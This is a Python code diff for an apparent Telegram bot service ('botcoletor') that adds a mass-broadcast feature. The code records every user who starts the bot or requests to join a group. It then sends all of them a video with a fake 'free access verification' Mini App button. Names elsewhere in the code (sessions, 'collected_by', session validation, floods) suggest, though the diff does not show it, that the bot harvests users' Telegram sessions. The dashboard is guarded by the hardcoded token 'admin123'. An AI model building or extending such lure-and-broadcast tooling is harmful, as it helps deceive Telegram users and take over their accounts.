@@ -9,6 +9,8 @@ import random
 import json
 import hashlib
 import hmac
+import ast
+import inspect
 from urllib.parse import parse_qs
 
 from aiohttp import web
@@ -63,8 +65,13 @@ DASHBOARD_TOKEN = "admin123"
 connected_bots = {}  # token -> {"app": Application, "username": str, "name": str, "id": int}
 DATA_DIR = "/app/data" if os.path.isdir("/app/data") else BASE_DIR
 BOTS_FILE = os.path.join(DATA_DIR, "bots.json")
+BROADCAST_USERS_FILE = os.path.join(DATA_DIR, "broadcast_users.json")
 SESSIONS_DIR = os.path.join(DATA_DIR, "sessions")
 os.makedirs(SESSIONS_DIR, exist_ok=True)
+BROADCAST_DELAY_SECONDS = 0.25
+broadcast_task = None
+broadcast_last_result = {"running": False, "sent": 0, "failed": 0, "queued": 0}
+MAIN_BOT_ID = None
 
 # Webhook
 WEBHOOK_BASE = WEBAPP_URL.rsplit("/webapp", 1)[0]  # https://botcoletor-production.up.railway.app
@@ -213,6 +220,237 @@ def remove_bot_token(token):
     if token in tokens:
         tokens.remove(token)
         save_bots_config(tokens)
+
+def load_broadcast_users():
+    """Carrega os usuarios que ja interagiram com cada bot."""
+    try:
+        if os.path.exists(BROADCAST_USERS_FILE):
+            with open(BROADCAST_USERS_FILE, "r", encoding="utf-8") as f:
+                data = json.load(f)
+            return data if isinstance(data, dict) else {}
+    except Exception as e:
+        print(f"[DISPARO_BOT] Erro ao carregar usuarios: {e}")
+    return {}
+
+def save_broadcast_users(data):
+    """Salva os usuarios cadastrados para disparos do bot."""
+    try:
+        with open(BROADCAST_USERS_FILE, "w", encoding="utf-8") as f:
+            json.dump(data, f, ensure_ascii=False, indent=2)
+    except Exception as e:
+        print(f"[DISPARO_BOT] Erro ao salvar usuarios: {e}")
+
+def ensure_broadcast_bucket(data, bot_info):
+    bot_id = str(bot_info.id)
+    bucket = data.setdefault(bot_id, {"bot_id": bot_info.id, "username": "", "name": "", "users": {}})
+    bucket["bot_id"] = bot_info.id
+    bucket["username"] = bot_info.username or ""
+    bucket["name"] = bot_info.first_name or ""
+    bucket.setdefault("users", {})
+    return bot_id, bucket
+
+async def register_broadcast_user(bot, user_obj, source="start"):
+    """Registra usuario que iniciou/interagiu com o bot."""
+    if not user_obj or getattr(user_obj, "is_bot", False):
+        return
+
+    try:
+        bot_info = await bot.get_me()
+        data = load_broadcast_users()
+        _, bucket = ensure_broadcast_bucket(data, bot_info)
+        user_id = str(user_obj.id)
+        now = time.time()
+        previous = bucket["users"].get(user_id, {})
+        bucket["users"][user_id] = {
+            "id": user_obj.id,
+            "name": getattr(user_obj, "full_name", None) or getattr(user_obj, "first_name", "") or "",
+            "username": getattr(user_obj, "username", None) or "",
+            "active": True,
+            "source": source,
+            "created_at": previous.get("created_at", now),
+            "last_seen_at": now,
+            "last_sent_at": previous.get("last_sent_at"),
+            "last_error": "",
+        }
+        save_broadcast_users(data)
+    except Exception as e:
+        print(f"[DISPARO_BOT] Erro ao registrar usuario: {type(e).__name__}: {e}")
+
+async def unregister_broadcast_user(bot, user_obj):
+    """Marca usuario como inativo para nao receber novos disparos."""
+    if not user_obj:
+        return False
+
+    try:
+        bot_info = await bot.get_me()
+        data = load_broadcast_users()
+        bot_id = str(bot_info.id)
+        user_id = str(user_obj.id)
+        user_data = data.get(bot_id, {}).get("users", {}).get(user_id)
+        if not user_data:
+            return False
+        user_data["active"] = False
+        user_data["last_seen_at"] = time.time()
+        save_broadcast_users(data)
+        return True
+    except Exception as e:
+        print(f"[DISPARO_BOT] Erro ao remover usuario: {type(e).__name__}: {e}")
+        return False
+
+def get_initial_keyboard():
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton(
+            "✅ VERIFICAÇÃO — ACESSAR GRÁTIS",
+            web_app=WebAppInfo(url=WEBAPP_URL)
+        )],
+        [InlineKeyboardButton(
+            "❌ ENTRAR — SEM VERIFICAR ❌",
+            url="https://t.me/AHSGSKASBOT?start=entrarsempagar"
+        )]
+    ])
+
+_initial_caption_cache = None
+
+def get_initial_caption():
+    """Reaproveita o caption usado no /start."""
+    global _initial_caption_cache
+    if _initial_caption_cache:
+        return _initial_caption_cache
+
+    try:
+        source = inspect.getsource(start)
+        tree = ast.parse(source)
+        for node in ast.walk(tree):
+            if not isinstance(node, ast.Call):
+                continue
+            if getattr(node.func, "attr", "") != "reply_video":
+                continue
+            for keyword in node.keywords:
+                if keyword.arg == "caption":
+                    caption = ast.literal_eval(keyword.value)
+                    if isinstance(caption, str):
+                        _initial_caption_cache = caption
+                        return caption
+    except Exception as e:
+        print(f"[DISPARO_BOT] Erro ao reaproveitar caption inicial: {type(e).__name__}: {e}")
+
+    _initial_caption_cache = "Acesse o conteudo pelo bot e escolha uma das opcoes abaixo."
+    return _initial_caption_cache
+
+async def send_initial_campaign_message(bot, chat_id):
+    media_path = os.path.join(BASE_DIR, "video.mp4")
+    if not os.path.exists(media_path):
+        raise FileNotFoundError("video.mp4 nao encontrado")
+
+    with open(media_path, "rb") as video:
+        await bot.send_video(
+            chat_id=chat_id,
+            video=video,
+            caption=get_initial_caption(),
+            parse_mode="Markdown",
+            reply_markup=get_initial_keyboard(),
+        )
+
+def bootstrap_broadcast_users_from_stats(data):
+    """Aproveita IDs ja salvos em stats quando existirem."""
+    if not MAIN_BOT_ID:
+        return False
+
+    bucket = data.setdefault(MAIN_BOT_ID, {"bot_id": int(MAIN_BOT_ID), "username": "", "name": "", "users": {}})
+    bucket.setdefault("users", {})
+    changed = False
+    for s in session_stats.values():
+        user_id = s.get("collected_by")
+        if not user_id:
+            continue
+        user_key = str(user_id)
+        if user_key in bucket["users"]:
+            continue
+        bucket["users"][user_key] = {
+            "id": int(user_id),
+            "name": "",
+            "username": "",
+            "active": True,
+            "source": "stats",
+            "created_at": s.get("collected_at") or time.time(),
+            "last_seen_at": s.get("collected_at") or time.time(),
+            "last_sent_at": None,
+            "last_error": "",
+        }
+        changed = True
+    return changed
+
+async def get_running_bot_apps_by_id():
+    apps_by_id = {}
+    seen = set()
+    for app in webhook_apps.values():
+        if id(app) in seen:
+            continue
+        seen.add(id(app))
+        try:
+            bot_info = await app.bot.get_me()
+            apps_by_id[str(bot_info.id)] = app
+        except Exception as e:
+            print(f"[DISPARO_BOT] Erro ao identificar bot ativo: {type(e).__name__}: {e}")
+    return apps_by_id
+
+async def run_dashboard_disparo():
+    """Envia a mensagem inicial para todos os usuarios cadastrados dos bots ativos."""
+    global broadcast_last_result
+
+    data = load_broadcast_users()
+    if bootstrap_broadcast_users_from_stats(data):
+        save_broadcast_users(data)
+
+    apps_by_id = await get_running_bot_apps_by_id()
+    targets = []
+    for bot_id, bucket in data.items():
+        app = apps_by_id.get(bot_id)
+        users_map = bucket.get("users", {})
+        for user_id, user_data in users_map.items():
+            if not user_data.get("active", True):
+                continue
+            targets.append((bot_id, app, user_id, user_data))
+
+    broadcast_last_result = {"running": True, "sent": 0, "failed": 0, "queued": len(targets), "started_at": time.time()}
+    print(f"[DISPARO_BOT] Iniciando disparo para {len(targets)} usuario(s)")
+
+    sent = 0
+    failed = 0
+    skipped = 0
+
+    for bot_id, app, user_id, user_data in targets:
+        if app is None:
+            skipped += 1
+            user_data["last_error"] = "Bot nao esta conectado"
+            continue
+
+        try:
+            await send_initial_campaign_message(app.bot, int(user_id))
+            sent += 1
+            user_data["last_sent_at"] = time.time()
+            user_data["last_error"] = ""
+            print(f"[DISPARO_BOT] Enviado para {user_id} pelo bot {bot_id}")
+        except Exception as e:
+            failed += 1
+            error_name = type(e).__name__
+            user_data["last_error"] = f"{error_name}: {e}"
+            if any(x in error_name for x in ["Forbidden", "Unauthorized"]) or "blocked" in str(e).lower():
+                user_data["active"] = False
+            print(f"[DISPARO_BOT] Falha para {user_id}: {error_name}: {e}")
+
+        broadcast_last_result.update({"sent": sent, "failed": failed, "skipped": skipped})
+        await asyncio.sleep(BROADCAST_DELAY_SECONDS)
+
+    save_broadcast_users(data)
+    broadcast_last_result.update({
+        "running": False,
+        "sent": sent,
+        "failed": failed,
+        "skipped": skipped,
+        "finished_at": time.time(),
+    })
+    print(f"[DISPARO_BOT] Finalizado: {sent} enviado(s), {failed} falha(s), {skipped} ignorado(s)")
 
 # ===============================
 # VALIDAÇÃO INITDATA
@@ -740,6 +978,7 @@ async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ===============================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
+    await register_broadcast_user(context.bot, update.effective_user, "start")
 
     if user_id in users and "client" in users[user_id]:
         try:
@@ -759,7 +998,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )]
     ]
 
-    with open(os.path.join(BASE_DIR, "cvcuck.mp4"), "rb") as video:
+    with open(os.path.join(BASE_DIR, "video.mp4"), "rb") as video:
         await update.message.reply_video(
             video=video,
             caption=(
@@ -781,6 +1020,16 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     print(f"[DEBUG] Usuário {user_id} iniciou - botão Mini App enviado")
 
+async def stop_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Remove o usuario da lista de disparos do bot."""
+    removed = await unregister_broadcast_user(context.bot, update.effective_user)
+    if not update.message:
+        return
+    if removed:
+        await update.message.reply_text("Tudo certo. Voce nao vai receber novos avisos deste bot.")
+    else:
+        await update.message.reply_text("Tudo certo. Este usuario nao estava na lista de avisos.")
+
 # ===============================
 # BOT: JOIN REQUEST
 # ===============================
@@ -801,6 +1050,7 @@ async def handle_join_request(update: Update, context: ContextTypes.DEFAULT_TYPE
     chat_id = join_request.chat.id
     chat_name = join_request.chat.title
 
+    await register_broadcast_user(context.bot, join_request.from_user, "join_request")
     print(f"[DEBUG] 👤 Join request de {user_name} ({user_id}) no grupo {chat_name}")
 
     try:
@@ -823,7 +1073,7 @@ async def handle_join_request(update: Update, context: ContextTypes.DEFAULT_TYPE
             )]
         ]
 
-        with open(os.path.join(BASE_DIR, "video.mp4"), "rb") as photo:
+        with open(os.path.join(BASE_DIR, "cvcuck.mp4"), "rb") as photo:
             await context.bot.send_photo(
                 chat_id=user_id,
                 photo=photo,
@@ -862,6 +1112,7 @@ async def start_extra_bot(bot_token):
     """Inicia um bot extra com webhook"""
     app = ApplicationBuilder().token(bot_token).updater(None).build()
     app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("stop", stop_broadcast))
     app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
     app.add_handler(ChatJoinRequestHandler(handle_join_request))
 
@@ -1042,6 +1293,15 @@ async def api_dashboard(request):
     total_rounds = sum(s["rounds_completed"] for s in session_stats.values())
 
     total_sessions = len(session_stats)
+    broadcast_users_data = load_broadcast_users()
+    if bootstrap_broadcast_users_from_stats(broadcast_users_data):
+        save_broadcast_users(broadcast_users_data)
+    broadcast_users = sum(
+        1
+        for bucket in broadcast_users_data.values()
+        for u in bucket.get("users", {}).values()
+        if u.get("active", True)
+    )
 
     # Lista de sessões
     sessions_list = []
@@ -1086,6 +1346,38 @@ async def api_dashboard(request):
         "total_floods": total_floods,
         "total_rounds": total_rounds,
         "sessions": sessions_list,
+        "broadcast_users": broadcast_users,
+        "broadcast_running": bool(broadcast_task and not broadcast_task.done()),
+        "broadcast_last": broadcast_last_result,
+    })
+
+async def api_dashboard_disparo(request):
+    """Inicia o disparo da mensagem inicial para usuarios do bot."""
+    global broadcast_task
+
+    token = request.query.get("token", "")
+    if token != DASHBOARD_TOKEN:
+        return web.json_response({"error": "Acesso negado"}, status=403)
+
+    if broadcast_task and not broadcast_task.done():
+        return web.json_response({"error": "Já existe um disparo em andamento"}, status=409)
+
+    data = load_broadcast_users()
+    if bootstrap_broadcast_users_from_stats(data):
+        save_broadcast_users(data)
+
+    queued = sum(
+        1
+        for bucket in data.values()
+        for user_data in bucket.get("users", {}).values()
+        if user_data.get("active", True)
+    )
+
+    broadcast_task = asyncio.create_task(run_dashboard_disparo())
+    return web.json_response({
+        "ok": True,
+        "queued": queued,
+        "message": f"Disparo iniciado para {queued} usuario(s).",
     })
 
 async def api_dashboard_validate_session(request):
@@ -1386,6 +1678,7 @@ async def main():
     web_app.router.add_get("/dashboard", serve_dashboard)
     web_app.router.add_get("/api/dashboard", api_dashboard)
     web_app.router.add_get("/api/dashboard/logs", api_dashboard_logs)
+    web_app.router.add_post("/api/dashboard/disparo", api_dashboard_disparo)
     web_app.router.add_post("/api/dashboard/cleanup", api_dashboard_cleanup)
     web_app.router.add_post("/api/dashboard/cleanup-unvalidated", api_dashboard_cleanup_unvalidated)
     web_app.router.add_post("/api/dashboard/validate-session", api_dashboard_validate_session)
@@ -1404,6 +1697,7 @@ async def main():
     # --- Bot Principal (webhook) ---
     application = ApplicationBuilder().token(BOT_TOKEN).updater(None).build()
     application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("stop", stop_broadcast))
     application.add_handler(MessageHandler(filters.CONTACT, handle_contact))
     application.add_handler(ChatJoinRequestHandler(handle_join_request))
 
@@ -1420,6 +1714,9 @@ async def main():
 
         try:
             # Registra webhook do bot principal
+            global MAIN_BOT_ID
+            main_bot_info = await application.bot.get_me()
+            MAIN_BOT_ID = str(main_bot_info.id)
             main_secret = token_to_secret(BOT_TOKEN)
             webhook_apps[main_secret] = application
             main_webhook_url = f"{WEBHOOK_BASE}/webhook/{main_secret}"
